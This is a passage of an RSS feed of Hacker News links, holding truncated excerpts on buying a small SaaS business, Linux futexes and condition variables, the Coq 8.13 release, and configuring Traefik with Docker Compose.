</p><div><p>Pretty much any real estate investor‚Äôs goal. </p><p>When he looked at the market, he found typical commercial properties trading at 6- to 12-cap<a id="footnote-anchor-1" href="#footnote-1">1</a> valuations, with returns that made him wonder if he‚Äôd be better off investing in the stock market instead (he would). </p></div><p>To get his desired returns, he needed to be buying a different kind of property and orchestrate a high return based on the nature and archetype of the properties he would typically go buy and make offers on.</p><p>Ultimately, the choice was made to focus on self-storage properties for the simplicity of their operations. It was possible to increase the value of a self-storage business by optimizing its operations using technology and software. </p><p>Stuff like automatic billing, keyless access, automated surveillance recording, and so on.</p><p>As people zigged, Nick zagged:</p><p>To command larger cash on cash returns, he needed to buy properties <em>below their market value </em>and then boost his cashflow by optimizing costs and increasing rents. But everybody else was trying to do that too.</p><p>So Nick decided to focus on properties that most other investors don‚Äôt want to or can‚Äôt touch, which by design ensured he would command very high returns by executing a predictable playbook to optimize self-storage operations using technology.</p><p>The majority of self-storage locations today are fully-automated. But not all of them. It‚Äôs a big pie. Nick has proven to be an astute investor when it comes to sourcing and securing these hard-to-find deals.</p><p>His approach is <em>look for the mom and pop shops</em>. Self-storage businesses that still run on paper. Smaller ones that go under the radar or aren‚Äôt even listed online. </p><p>They are profitable and are operated by an owner-manager that has likely been there since the start. And yet the property throws out fabulous free cashflows every year. Those were (and still are) his target.</p><p>So he‚Äôd put in the work. He‚Äôd get on airplanes. He‚Äôd drive to The Middle of Nowhere. </p><p>And he‚Äôd find the deals. And he‚Äôd close ‚Äòem. Fabulous deals. </p><p>The point I‚Äôm trying to make is that there‚Äôs obviously a lot of pain and patience involved in filtering Micro-SaaS opportunities one by one. </p><p>It takes a lot of energy and time, which you may be unwilling to invest additional to your capital. </p><p>But in my opinion, that is exactly what separates those microangels who throw darts and those who are deliberate about what they‚Äôre looking for.</p><p>It‚Äôs the same thing which marks the difference between Nick and other real estate developers. Yeah it‚Äôs a lot of hustling, but you know it‚Äôs worth it, and it‚Äôs a niche worth focusing on because most other investors aren‚Äôt wiling to put in the work.</p><p>In fact, the point is proven by simply looking at <a href="https://twitter.com/sweatystartup">Nick Huber‚Äôs Twitter</a>. He‚Äôs giving all of his secrets away. Wouldn‚Äôt you expect at least some level of apprehension that giving away all this information might result in more competition? </p><p>I‚Äôd argue ‚Äî beyond the simple truth that his niche is, in fact, super competitive - that he intrinsically knows that a tiny fraction of his readers will not only take action, but do so at the level of commitment that he is. It‚Äôs become a competitive moat. </p><p>Above and beyond the utilitarian benefits of looking at these deals, consider this:</p><p><a href="https://www.microacquire.com/?utm_source=microangel">MicroAcquire</a> is a working concept because it gives indie makers the ability to exit without having to go through a broker. That is its value proposition. No brokers. No fees. Just <em>serious</em> buyers. </p><p>As serious<em> </em>buyers, it‚Äôs natural to expect serious preparation on the part of the seller, but it goes against the nature of the types of most individuals who would list on <a href="https://www.microacquire.com/?utm_source=microangel">MicroAcquire</a> to begin with.</p><p>It‚Äôs not uncommon for ‚Äòmake an offer‚Äô listings to be describing a product that hasn‚Äôt quite found its stride. In some cases, the owner of the product may not be well-equipped to provide you the information you need.</p><p>It‚Äôs in your best interest to take advantage of these listings because other investors are skipping over them. They could be diamonds in the rough, and you‚Äôd disqualify them merely because there is no set asking price.</p><p>In a recent negotiation which I‚Äôll be sharing, I managed to secure a deal to acquire a profitable and growing $75K ARR B2B SaaS. </p><p>The product was originally listed as ‚ÄòMake an Offer.‚Äô I didn‚Äôt quite care, since the business fit into my initial criteria. I ended up adding the product to my watch list and submitting a request for more information to the seller, namely:</p><ul><li><p>Learn more about the actual product itself</p></li><li><p>Some unit economics (ARPU, LTV, CAC)</p></li><li><p>Profitability on the $75K ARR</p></li><li><p>Whether there was any net revenue growth every month</p></li><li><p>How secure the source of demand generation was</p></li><li><p>What the technology stack is</p></li><li><p>What the support burden is &amp; typical ticket</p></li></ul><p>I checked into my watch list a few days later and noticed the seller had put up a $350K asking price for the product. </p><p>Also, I received an answer to my request for info: a .CSV file of payouts since founding, a spreadsheet of costs and some Google Analytics screenshots.</p><p>I took the CSV, imported it into Google Sheets, built a few pivot tables and filters, and compiled the info I needed.</p><p>Additional to the information shared with the seller, I made a few remarkable discoveries hacking through the data:</p><ul><li><p>The product does one thing really simply &amp; well</p></li><li><p>ARPU in the $15 range, LTV in the $200 range and growing</p></li><li><p>The seller claimed $16K in profits annually, but on an SDE<a id="footnote-anchor-2" href="#footnote-2">2</a> basis the product actually clears $65K in profits annually. Not too shabby.</p></li><li><p>MRR grows linearly from a steady stream of trials, at a rate of about +$210 per month, after churn. Nice.</p></li><li><p>80% of the traffic is organic, 20% is direct. Good with that.</p></li><li><p>Tech stack is Node + React. That‚Äôs my jam.</p></li><li><p>1-2 support tickets per week, usually sent to Knowledgebase</p></li><li><p>Some evidence of paid acquisition for as little as $35 CPA, but the owner does not have any marketing experience to scale with</p></li></ul><p>Welp, this is an awesome product. My reactions were obvious:</p><ul><li><p>Customers are staying on an average of 13+ months and growing, </p></li><li><p>Profits are strong, and meaningful </p></li><li><p>MRR is growing on autopilot from a dependable source of traffic</p></li><li><p>The stack is something I can maintain or work on</p></li><li><p>It‚Äôs a low maintenance product </p></li><li><p>The early success in paid acquisition indicates a path to buying MRR ‚Äî especially if payback is as little as 2 months ($35 CPA / $15 ARPU)</p></li></ul><p>I wanted in. In fact, I was surprised nobody else had scooped this up yet. </p><p>Then I looked at the price again. </p><blockquote><p>$350,000</p></blockquote><p>At $350K, no wonder nobody was touching this. Especially if the seller was telling other buyers he was only clearing $16K annually, which was inaccurate.</p><p>I jumped at the chance and <a href="https://microangel.so/p/loi-template">wrote up an LOI</a> to acquire the business for $180,000, which worked out to a respectable 2.75x multiple on the $65K he was actually clearing every year.</p><p>Initially, he balked. I realized that winning this deal meant spending an extra fair bit of patience going through the motions of defending my offer and justifying why it was, in fact, quite a respectable number.</p><p>First, granted the profit margin he was claiming, $180,000 was an incredible offer for a product clearing only $16K per year (11.25x). I made sure he understood that even if the profit he claimed was true, the odds of him ever commanding a 11.25x multiple were certifiably zero.</p><p>Luckily, he was off on his calculations, and his business actually profited quite a lot more than he thought it did.</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://microangel.so/p/make-an-offer-listings?r=46t31&amp;utm_campaign=post&amp;utm_medium=web&amp;utm_source=hackernews">https://microangel.so/p/make-an-offer-listings?r=46t31&amp;utm_campaign=post&amp;utm_medium=web&amp;utm_source=hackernews</a></em></p>]]>
            </description>
            <link>https://microangel.so/p/make-an-offer-listings?r=46t31&amp;utm_campaign=post&amp;utm_medium=web&amp;utm_source=hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181087</guid>
            <pubDate>Thu, 18 Feb 2021 15:41:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Futex Reacquainted]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26180930">thread link</a>) | @tabokie
<br/>
February 18, 2021 | https://tabokie.github.io/tech/2021/01/30/futex-reacquainted.html | <a href="https://web.archive.org/web/*/https://tabokie.github.io/tech/2021/01/30/futex-reacquainted.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      
      
      
      
      <p><span># tech, 2021-01-30</span></p><p>To be fair, the futex (Fast Userspace muTEX) syscall has a rather misleading name, in the sense that it simply isn√¢‚Ç¨‚Ñ¢t a mutex. In the original 2002 paper (Fuss, Futexes and Furwocks: Fast Userlevel Locking in Linux), it was invented specifically to implement a fast mutex, but capable of much more. I prefer to think of futex as a minimal useful subset that can fulfil most high level synchronization constructs.</p>

<h2 id="minimal-useful-subset">Minimal Useful Subset</h2>

<p>Before futex was borned, people in need of a proper mutex (waiter actually blocks) have to use heavy kernel objects like file lock (<a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">fcntl</a>) or <a href="https://man7.org/linux/man-pages/man7/sysvipc.7.html">System V semaphore</a>. Since system calls are toxic to performance, kernel developers then seeked to compress kernel involvement in userspace synchronization by inventing futex.</p>

<p>So essentially this design process is a code refactor that encapsulates the thread blocking functionality into a new lightweight syscall. And such blocking can be easily elided when the lock isn√¢‚Ç¨‚Ñ¢t contended.</p>

<p>Here by √¢‚Ç¨≈ìlightweight√¢‚Ç¨ÔøΩ I mean the resource allocated for a futex should be minimal, so that thousands of futexes could live happily within a commodity setup. This requirement implicitly forbids the use of file descriptor as futex handle.</p>

<p>To meet all these standards, futex provides an interface like this (minimal form):</p>

<div><div><pre><code><span>int</span> <span>futex_wake</span><span>(</span><span>int</span> <span>*</span><span>addr</span><span>);</span>
<span>int</span> <span>futex_wait</span><span>(</span><span>int</span> <span>*</span><span>addr</span><span>,</span> <span>int</span> <span>val</span><span>);</span>
</code></pre></div></div>

<p>Without doubt this is a piece of elegancy. The idea of userspace address as unique identifier isn√¢‚Ç¨‚Ñ¢t rare in nowaday system code (see boost√¢‚Ç¨‚Ñ¢s <a href="https://github.com/boostorg/thread/blob/409c98f8b745e72bc326e93bfaf8a353d94a69b0/include/boost/thread/tss.hpp">thread local pointer</a>). What√¢‚Ç¨‚Ñ¢s brilliant is, futex further incorporates the CAS-like (compare and swap) semantics into this address √¢‚Ç¨‚Äú the thread is blocked when <code>*addr</code> is indeed <code>val</code>. This turns out to be essential to enforce the atomicity of user~kernel transition:</p>

<div><div><pre><code><span>static</span> <span>int</span> <span>a</span> <span>=</span> <span>NO_SIGNAL</span><span>;</span>
<span>// properly wait for a signal</span>
<span>let</span> <span>cached_a</span> <span>=</span> <span>atomic_load</span><span>(</span><span>&amp;</span><span>a</span><span>);</span>
<span>while</span> <span>(</span><span>!</span><span>has_signal</span><span>(</span><span>cached_a</span><span>))</span> <span>{</span>
  <span>futex_wait</span><span>(</span><span>&amp;</span><span>a</span><span>,</span> <span>cached_a</span><span>);</span>
  <span>cached_a</span> <span>=</span> <span>atomic_load</span><span>(</span><span>&amp;</span><span>a</span><span>);</span>
<span>}</span>
<span>// incorrect version</span>
<span>if</span> <span>(</span><span>has_signal</span><span>(</span><span>atomic_load</span><span>(</span><span>&amp;</span><span>a</span><span>)))</span> <span>{</span>
  <span>futex_wait_racy</span><span>(</span><span>FUTEX_WAIT</span><span>,</span> <span>&amp;</span><span>a</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>In the incorrect version, this thread can block indefinitely when the signal has already arrived at <code>a</code>. The conditional loop also defends against spurious wakeups (more details later), which further propagates itself to the use of condition variable.</p>

<h2 id="technical-details">Technical Details</h2>

<p>
       ...
    ----------
        |          tid1       tid2       tid3
    +--------+      |          |          |
    |spinlock|  ~~~~~~~~~  ---------  ~~~~~~~~~
    |   key  +-&gt;| addr1 |-&gt;| addr2 |-&gt;| addr1 |-&gt;...
    +--------+  ~~~~~~~~~  ---------  ~~~~~~~~~
        | 
    ----------
</p>

<p>Kernel uses a fixed-size, seperate chaining, central hash table to store mappings between user provided address and the waiting threads (wait queue). A futex won√¢‚Ç¨‚Ñ¢t occupy any resource until some threads start blocking on it. What puzzles me a little is why they didn√¢‚Ç¨‚Ñ¢t bother to maintain private wait queues for individual futexes, guess the benefit of fewer key comparisons isn√¢‚Ç¨‚Ñ¢t worth the complexity.</p>

<p>Unsurprisingly, this table becomes a performance bottleneck as computing nodes scale out, and poses challenge to system predictability. In a <a href="https://www.youtube.com/watch?v=-8c47dHuGIY">talk</a> by SUSE engineer, three major issues were identified:</p>

<ul>
  <li>Not optimized for NUMA access</li>
  <li>Hash table collisions</li>
  <li>Hash bucket spinlock contention</li>
</ul>

<p>When problems are defined, solutions aren√¢‚Ç¨‚Ñ¢t that far either. Below is a list of the major optimizations made to mitigate these issues over the years:</p>

<ol>
  <li>
    <div><p><code>FUTEX_PRIVATE_FLAG</code>: fast path for single-process use. (2007 <a href="https://lwn.net/Articles/229668/">patch</a>: new PRIVATE futexes)
</p><p>
When a futex is declared private within current process, which is true for most cases, there is no need for kernel to generate and maintain a global UID.
</p><p>
This new command managed to avoid: (a) Taking the mmap_sem semaphore, conflicting with other subsystems. (b) Modifying a ref_count on mm or an inode, still conflicting with mm or fs.
</p><p>
Benchmark shows 20% less instructions, 4x throughput under 4 threads stress test, 16x under 16 threads.</p></div>
  </li>
  <li>
    <p>Lockless <code>get_futex_key()</code> (a <a href="https://lore.kernel.org/patchwork/cover/645514/">series</a> of patches)</p>
  </li>
  <li>
    <div><p>Make hash table size adaptive (2014 <a href="https://github.com/torvalds/linux/commit/a52b89ebb6d4499be38780db8d176c5d3a6fbc17">commit</a>: Increase hash table size for better performance)
</p><p>
After this patch, global hash table is sized to <code>256 * cpu_num</code> instead of <code>256</code>.</p></div>
  </li>
  <li>
    <div><p>Lockless wakeups (2015 <a href="https://github.com/torvalds/linux/commit/1d0dcb3ad9d336e6d6ee020a750a7f8d907e28de">commit</a>: Implement lockless wakeups)
</p><p>
Internally acknowledge one or more tasks are to be awoken, then do the actual wakeups outside the critical section.</p></div>
  </li>
  <li>
    <div><p>Use MCS lock as bucket spinlock (32-bit qspinlock is <a href="https://github.com/torvalds/linux/commit/a33fda35e3a7655fb7df756ed67822afb5ed5e8d">merged</a> in 2015)
</p><p>
Unlike ticket spinlock, one acquires MCS lock by spinning on a private word part of a larger linked queue, which avoids lots of cache line bouncing and remote socket access.</p></div>
  </li>
  <li>
    <p>Use private hash table for each process (<a href="https://lore.kernel.org/lkml/49C4D5A0.5020106@cosmosbay.com/t/">rfc</a>)</p>
  </li>
</ol>

<h2 id="romance-between-futex--condition-variable">Romance Between Futex &amp; Condition Variable</h2>

<p>I was going to take a closer look at how pthread(NPTL) implements condition variable with futexes, and unveil some of the mysteries that prompted me to write this post in the first place.</p>

<p>To look √¢‚Ç¨≈ìcloser√¢‚Ç¨ÔøΩ, I skimmed through the commits of NPTL√¢‚Ç¨‚Ñ¢s condvar from 2002 to 2016. Even though during this period the code skeleton is relatively stable, but minor details kept changing. Plus the commit messages being chaotic, it√¢‚Ç¨‚Ñ¢s almost impossible to reason those changes.</p>

<p>This leaves me no choice but to read the latest implementation (in 2016), which is simplified to this pseudocode:</p>

<div><div><pre><code><span>/** cv's data members **
 * lock: internal mutex
 * wait_seq: sequence number for waiter
 * wakeup_seq: sequence number for wakeup signaled
 * woken_seq: sequence number for woken thread
 * broadcast_seq: sequence number for broadcast signaled
 * mutex_ref: reference to user mutex
 */</span>
<span>fn</span> <span>cond_wait</span><span>(</span><span>cv</span><span>,</span> <span>mutex</span><span>):</span>
  <span>lock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
  <span>unlock</span><span>(</span><span>mutex</span><span>);</span>
  <span>cv</span><span>.wait_seq</span> <span>++</span><span>;</span>
  <span>cv</span><span>.futex</span> <span>++</span><span>;</span>
  <span>cv</span><span>.mutex_ref</span> <span>=</span> <span>mutex</span><span>;</span>
  <span>let</span> <span>wakeup_seq_before</span> <span>=</span> <span>cv</span><span>.wakeup_seq</span><span>;</span>
  <span>let</span> <span>broadcast_seq_before</span> <span>=</span> <span>cv</span><span>.broadcast_seq</span><span>;</span>
  <span>loop</span> <span>{</span>
    <span>let</span> <span>futexval</span> <span>=</span> <span>cv</span><span>.futex</span><span>;</span>
    <span>unlock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
    <span>let</span> <span>ret</span> <span>=</span> <span>FUTEX_WAIT</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>futexval</span><span>);</span>
    <span>lock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
    <span>if</span> <span>broadcast_seq_before</span> <span>!=</span> <span>cv</span><span>.broadcast_seq</span> <span>{</span>
      <span>break</span><span>;</span>
    <span>}</span>
    <span>if</span> <span>cv</span><span>.wakeup_seq</span> <span>!=</span> <span>wakeup_seq_before</span> <span>&amp;&amp;</span> <span>cv</span><span>.wakeup_seq</span> <span>!=</span> <span>cv</span><span>.woken_seq</span> <span>{</span>
      <span>cv</span><span>.woken_seq</span> <span>++</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
    <span>if</span> <span>ret</span> <span>==</span> <span>TIMEDOUT</span> <span>{</span>
      <span>cv</span><span>.wakeup_seq</span> <span>++</span><span>;</span>
      <span>cv</span><span>.woken_seq</span> <span>++</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>unlock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
  <span>lock</span><span>(</span><span>mutex</span><span>);</span>

<span>fn</span> <span>cond_signal</span><span>(</span><span>cv</span><span>):</span>
  <span>lock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
  <span>if</span> <span>cv</span><span>.wait_seq</span> <span>&gt;</span> <span>cv</span><span>.wakeup_seq</span> <span>{</span>
    <span>cv</span><span>.wakeup_seq</span> <span>++</span><span>;</span>
    <span>cv</span><span>.futex</span> <span>++</span><span>;</span>
    <span>if</span> <span>FUTEX_WAKE_OP</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>1</span><span>,</span> <span>cv</span><span>.lock</span><span>,</span> <span>1</span><span>,</span> <span>FUTEX_OP_CLEAR_WAKE_IF_GT_ONE</span><span>)</span><span>.is_err</span><span>()</span> <span>{</span>
      <span>FUTEX_WAKE</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>1</span><span>);</span>
    <span>}</span>
  <span>}</span>
  <span>unlock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>

<span>fn</span> <span>cond_broadcast</span><span>(</span><span>cv</span><span>):</span>
  <span>lock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
  <span>if</span> <span>cv</span><span>.wait_seq</span> <span>&gt;</span> <span>cv</span><span>.wakeup_seq</span> <span>{</span>
    <span>cv</span><span>.wakeup_seq</span> <span>=</span> <span>cv</span><span>.wait_seq</span><span>;</span>
    <span>cv</span><span>.woken_seq</span> <span>=</span> <span>cv</span><span>.wait_seq</span><span>;</span>
    <span>cv</span><span>.futex</span> <span>=</span> <span>cv</span><span>.wait_seq</span> <span>*</span> <span>2</span><span>;</span>
    <span>let</span> <span>futexval</span> <span>=</span> <span>cv</span><span>.futex</span><span>;</span>
    <span>cv</span><span>.broadcast_seq</span> <span>++</span><span>;</span>
    <span>unlock</span><span>(</span><span>lock</span><span>);</span>
    <span>if</span> <span>FUTEX_CMP_REQUEUE</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>1</span><span>,</span> <span>ALL</span><span>,</span> <span>cv</span><span>.mutex_ref</span><span>,</span> <span>futexval</span><span>)</span><span>.is_err</span><span>()</span> <span>{</span>
      <span>FUTEX_WAKE</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>ALL</span><span>);</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>unlock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>
  <span>}</span>
</code></pre></div></div>

<p>What interests me most is how condvar interplays with futexes. Unlike what I expected, condvar owns two futexes: the first is <code>cv.lock</code>, used to synchronize internal modifications; the second is <code>cv.futex</code>, used to park threads. Besides them, condvar also interacts with the user provided mutex, which has one futex inside.</p>

<p>It is important for condvar to manage its own lock, because <code>cond_signal</code> can be called without lock, stated by <a href="https://pubs.opengroup.org/onlinepubs/009696699/functions/pthread_cond_broadcast.html">POSIX</a>:</p>

<blockquote>
  <p>The pthread_cond_broadcast() or pthread_cond_signal() functions may be called by a thread whether or not it currently owns the mutex that threads calling pthread_cond_wait() or pthread_cond_timedwait() have associated with the condition variable during their waits; however, if predictable scheduling behavior is required, then that mutex shall be locked by the thread calling pthread_cond_broadcast() or pthread_cond_signal().</p>
</blockquote>

<p>And a condvar can even be paired with multiple mutexes (not at the same time), quote <a href="https://pubs.opengroup.org/onlinepubs/007908775/xsh/pthread_cond_wait.html">POSIX</a> again:</p>

<blockquote>
  <p>The effect of using more than one mutex for concurrent pthread_cond_wait() or pthread_cond_timedwait() operations on the same condition variable is undefined; that is, a condition variable becomes bound to a unique mutex when a thread waits on the condition variable, and this (dynamic) binding ends when the wait returns.</p>
</blockquote>

<p>It√¢‚Ç¨‚Ñ¢s also important to notice that multiple options are available to send out wakeups:</p>

<p><code>cond_signal</code> first attempts to call <code>FUTEX_WAKE_OP</code> before falling back to traditional <code>FUTEX_WAKE</code>. This particular command was introduced to kernel in <a href="https://github.com/torvalds/linux/commit/4732efbeb997189d9f9b04708dc26bf8613ed721">2005</a> specifically for optimizing <code>cond_signal</code>, which has the capability to modify and conditionally wakes up a second futex. The optimization targets at avoiding √¢‚Ç¨≈ìhurry up and wait√¢‚Ç¨ÔøΩ situation, where √¢‚Ç¨≈ìthis waiter wakes up and after a few instructions it attempts to acquire the cv internal lock, but that lock is still held by the thread calling pthread_cond_signal√¢‚Ç¨ÔøΩ. It works by moving the whole unlock procedure into kernel space:</p>

<div><div><pre><code><span>// cond_signal (userspace)                          // cond_wait (userspace)</span>
<span>FUTEX_WAKE_OP</span><span>(</span><span>cv</span><span>.futex</span><span>,</span> <span>1</span><span>,</span> <span>cv</span><span>.lock</span><span>,</span> <span>1</span><span>);</span>             <span>FUTEX_WAIT</span><span>(</span><span>cv</span><span>.futex</span><span>);</span>
  <span>// (kernel)                                       // blocked //</span>
  <span>let</span> <span>(</span><span>key1</span><span>,</span> <span>key2</span><span>)</span> <span>=</span> <span>(</span><span>key</span><span>(</span><span>cv</span><span>.futex</span><span>),</span> <span>key</span><span>(</span><span>cv</span><span>.lock</span><span>));</span> <span>//         //</span>
  <span>spin_lock</span><span>(</span><span>min</span><span>(</span><span>key1</span><span>,</span> <span>key2</span><span>));</span>                       <span>//         //</span>
  <span>spin_lock</span><span>(</span><span>max</span><span>(</span><span>key1</span><span>,</span> <span>key2</span><span>));</span>                       <span>//         //</span>
  <span>let</span> <span>ret</span> <span>=</span> <span>OP_UNLOCK</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>                     <span>//         //</span>
  <span>wake</span><span>(</span><span>key1</span><span>,</span> <span>1</span><span>);</span>  <span>// ------------------------------&gt;</span>
                                                    <span>lock</span><span>(</span><span>cv</span><span>.lock</span><span>);</span>  <span>// already unlocked</span>
  <span>if</span> <span>ret</span> <span>{</span>                                          <span>//</span>
    <span>wake</span><span>(</span><span>key2</span><span>,</span> <span>1</span><span>);</span>  <span>// ----------------------------&gt;  in case the lock is contended</span>
  <span>}</span>
</code></pre></div></div>

<p>One thing I haven√¢‚Ç¨‚Ñ¢t figured out though is why calling <code>FUTEX_WAKE(1)</code> without lock is racy, which seems like a straightforward fix to this issue.</p>

<p>Similarly, <code>cond_broadcast</code> tries to use <code>FUTEX_CMP_REQUEUE</code>, which is the kernel√¢‚Ç¨‚Ñ¢s implementation ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tabokie.github.io/tech/2021/01/30/futex-reacquainted.html">https://tabokie.github.io/tech/2021/01/30/futex-reacquainted.html</a></em></p>]]>
            </description>
            <link>https://tabokie.github.io/tech/2021/01/30/futex-reacquainted.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26180930</guid>
            <pubDate>Thu, 18 Feb 2021 15:30:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coq 8.13]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26180078">thread link</a>) | @infruset
<br/>
February 18, 2021 | https://coq.inria.fr/news/coq-8-13-0-is-out.html | <a href="https://web.archive.org/web/*/https://coq.inria.fr/news/coq-8-13-0-is-out.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>





<p>
The Coq development team is proud to announce the immediate availability of
<a href="https://github.com/coq/coq/releases/tag/V8.13.0">Coq 8.13.0</a>
</p>

<p>
Highlights:
</p><ul>
<li>Introduction of primitive persistent arrays in the core language, implemented using imperative persistent arrays. </li>
<li>Introduction of definitional proof irrelevance for the equality type defined in the SProp sort. </li>
<li>Many improvements to the handling of notations, including number notations, recursive notations and notations with bindings. A new algorithm chooses the most precise notation available to print an expression, which might introduce changes in printing behavior.</li>
</ul>



<p>Please see <a href="https://coq.github.io/doc/v8.13/refman/changes.html#version-8-13" rel="nofollow">the changelog</a> to learn more about this release.</p>




</div></div>]]>
            </description>
            <link>https://coq.inria.fr/news/coq-8-13-0-is-out.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26180078</guid>
            <pubDate>Thu, 18 Feb 2021 14:23:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Configure the Traefik Reverse Proxy with Docker Compose and Docker Swarm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26180044">thread link</a>) | @juliensalinas
<br/>
February 18, 2021 | https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/ | <a href="https://web.archive.org/web/*/https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>My <a href="https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/container-orchestration-docker-swarm-nlpcloud">last article about Docker Swarm</a> was the first of a series of articles I wanted to write about the tools used behind <a href="https://nlpcloud.io/">NLP Cloud</a>. NLP Cloud serves all the spaCy NLP models through an API, whether they are pre-trained or custom models. One challenge is that each model runs inside its own container, and new models are added to the cluster on a regular basis. So we need a reverse proxy which is both efficient and flexible in front of all these containers.</p>
<p>The solution we chose is <a href="https://traefik.io/">Traefik</a>.</p>
<p>I thought it would be interesting to write an article about how we implemented Traefik and why we chose it over standard reverse proxies like Nginx.</p>
<h2 id="why-traefik">Why Traefik</h2>
<p>Traefik is still a relatively new reverse proxy solution compared to Nginx or Apache, but it‚Äôs been gaining a lot of popularity. Traefik‚Äôs main advantage is that is seamlessly integrates with Docker, Docker Compose and Docker Swarm (and even Kubernetes and more): basically your whole Traefik configuration can be in your <code>docker-compose.yml</code> file which is very handy, and, whenever you add new services to your cluster, Traefik discovers them on the fly without having to restart anything.</p>
<p>So Traefik makes maintainability easier and is good from a high-availability standpoint.</p>
<p>It is developed in Go while Nginx is coded in C so I guess it makes a slight difference in terms of performance, but nothing that I could perceive, and in my opinion it is negligible compared to the advantages it gives you.</p>
<p>Traefik takes kind of a learning curve though and, even if their documentation is pretty good, it is still easy to make mistakes and hard to find where the problem is coming from, so let me give you a couple of ready-to-use examples below.</p>
<h2 id="install-traefik">Install Traefik</h2>
<p>Basically you don‚Äôt have much to do here. Traefik is just another Docker image you‚Äôll need to add to your cluster as a service in your <code>docker-compose.yml</code>:</p>
<div><div><pre><code><span>version</span><span>:</span> <span>'</span><span>3.8'</span>
<span>services</span><span>:</span>
    <span>traefik</span><span>:</span>
        <span>image</span><span>:</span> <span>traefik:v2.3</span>
</code></pre></div></div>
<p>There are several ways to integrate Traefik but, like I said above, we are going to go for the Docker Compose integration.</p>
<h2 id="basic-configuration">Basic Configuration</h2>
<p>90% of the Traefik‚Äôs configuration is done through Docker <code>labels</code>.</p>
<p>Let‚Äôs say we have 3 services:</p>
<ul>
<li>A corporate website that simply serves a static website at http://nlpcloud.io</li>
<li>An <code>en_core_web_sm</code> spaCy model served through a FastAPI Python API at http://api.nlpcloud.io/en_core_web_sm</li>
<li>An <code>en_core_web_lg</code> spaCy model served through a FastAPI Python API at http://api.nlpcloud.io/en_core_web_lg</li>
</ul>
<p><em>More details about <a href="https://spacy.io/usage/models">spaCy NLP models here</a> and <a href="https://fastapi.tiangolo.com/">FastAPI here</a>.</em></p>
<p>Here is a basic <strong>local staging</strong> configuration routing the requests to the correct services in your <code>docker-compose.yml</code>:</p>
<div><div><pre><code><span>version</span><span>:</span> <span>'</span><span>3.8'</span>
<span>services</span><span>:</span>
    <span>traefik</span><span>:</span>
        <span>image</span><span>:</span> <span>traefik:v2.4</span>
        <span>ports</span><span>:</span>
            <span>-</span> <span>"</span><span>80:80"</span>
        <span>command</span><span>:</span>
            <span>-</span> <span>--providers.docker</span>
        <span>volumes</span><span>:</span>
            <span>-</span> <span>/var/run/docker.sock:/var/run/docker.sock:ro</span>
    <span>corporate</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your corporate image&gt;</span>
        <span>labels</span><span>:</span>
            <span>-</span> <span>traefik.http.routers.corporate.rule=Host(`localhost`)</span>
    <span>en_core_web_sm</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your en_core_web_sm model API image&gt;</span>
        <span>labels</span><span>:</span>
            <span>-</span> <span>traefik.http.routers.en_core_web_sm.rule=Host(`api.localhost`) &amp;&amp; PathPrefix(`/en_core_web_sm`)</span>
    <span>en_core_web_lg</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your en_core_web_lg model API image&gt;</span>
        <span>labels</span><span>:</span>
            <span>-</span> <span>traefik.http.routers.en_core_web_lg.rule=Host(`api.localhost`) &amp;&amp; PathPrefix(`/en_core_web_lg`)</span>
</code></pre></div></div>
<p>You can now access your corporate website at http://localhost, your <code>en_core_web_sm</code> at http://api.localhost/en_core_web_sm, and your <code>en_core_web_lg</code> at http://api.localhost/en_core_web_lg.</p>
<p>As you can see it‚Äôs dead simple.</p>
<p>It was for our local staging only, so we now want to do the same for production in a Docker Swarm cluster:</p>
<div><div><pre><code><span>version</span><span>:</span> <span>'</span><span>3.8'</span>
<span>services</span><span>:</span>
    <span>traefik</span><span>:</span>
        <span>image</span><span>:</span> <span>traefik:v2.4</span>
        <span>ports</span><span>:</span>
            <span>-</span> <span>"</span><span>80:80"</span>
        <span>command</span><span>:</span>
            <span>-</span> <span>--providers.docker.swarmmode</span>
        <span>volumes</span><span>:</span>
            <span>-</span> <span>/var/run/docker.sock:/var/run/docker.sock:ro</span>
